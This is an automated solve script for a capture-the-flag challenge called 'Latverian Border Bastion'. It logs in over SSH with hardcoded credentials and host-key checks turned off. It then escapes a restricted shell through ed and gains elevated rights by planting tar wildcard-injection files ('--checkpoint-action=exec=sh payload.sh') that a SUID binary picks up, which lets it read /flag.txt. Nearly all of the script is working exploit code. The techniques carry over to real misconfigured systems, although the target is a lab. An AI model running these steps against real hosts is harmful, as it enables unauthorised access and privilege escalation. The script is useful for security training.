#!/usr/bin/env python3
"""
Automated solve script for Challenge 1: Latverian Border Bastion
Connects via SSH, escapes rbash using ed, exploits SUID tar wildcard injection, and retrieves the flag.
"""
import sys
import time
import subprocess

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = sys.argv[2] if len(sys.argv) > 2 else "2222"
USER = "border-guard"
PASSWORD = "latveria_guard"

def solve():
    print(f"[*] Targeting {USER}@{HOST}:{PORT}...")

    # Commands sent sequentially over SSH stdin
    # 1. Escape rbash via ed
    # 2. Reset PATH to find standard binaries
    # 3. Create tar wildcard exploit payload
    # 4. Execute SUID binary /usr/local/bin/doom-monitor
    # 5. Read revealed flag
    payload_commands = (
        "ed\n"
        "!/bin/sh\n"
        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
        "cd /var/log/latveria/telemetry\n"
        "echo 'cat /flag.txt > /tmp/pwned_flag.txt; chmod 777 /tmp/pwned_flag.txt' > payload.sh\n"
        "chmod +x payload.sh\n"
        "touch './--checkpoint=1'\n"
        "touch './--checkpoint-action=exec=sh payload.sh'\n"
        "/usr/local/bin/doom-monitor\n"
        "cat /tmp/pwned_flag.txt\n"
        "rm -f payload.sh './--checkpoint=1' './--checkpoint-action=exec=sh payload.sh'\n"
        "exit\n"
        "q\n"
        "exit\n"
    )

    try:
        # Use sshpass or standard ssh batch mode with expect/subprocess
        cmd = [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-p", str(PORT),
            f"{USER}@{HOST}"
        ]
        
        # Test if sshpass is available
        check_sshpass = subprocess.run(["which", "sshpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if check_sshpass.returncode == 0:
            full_cmd = ["sshpass", "-p", PASSWORD] + cmd
            proc = subprocess.Popen(full_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = proc.communicate(input=payload_commands, timeout=20)
            output = stdout + stderr
        else:
            # Fallback to python pty / paramiko or direct ssh command
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(HOST, port=int(PORT), username=USER, password=PASSWORD, timeout=10)
                channel = client.invoke_shell()
                channel.send(payload_commands)
                time.sleep(2)
                output = channel.recv(4096).decode('utf-8', errors='ignore')
                client.close()
            except ImportError:
                print("[-] paramiko and sshpass not installed. Outputting manual solve instructions.")
                return

        for line in output.splitlines():
            if "YUVA{" in line or "FLAG{" in line:
                print(f"[+] Flag captured: {line.strip()}")
                return line.strip()

        print("[-] Flag not found in output. Raw output:")
        print(output)
    except Exception as e:
        print(f"[-] Exploit error: {e}")

if __name__ == "__main__":
    solve()
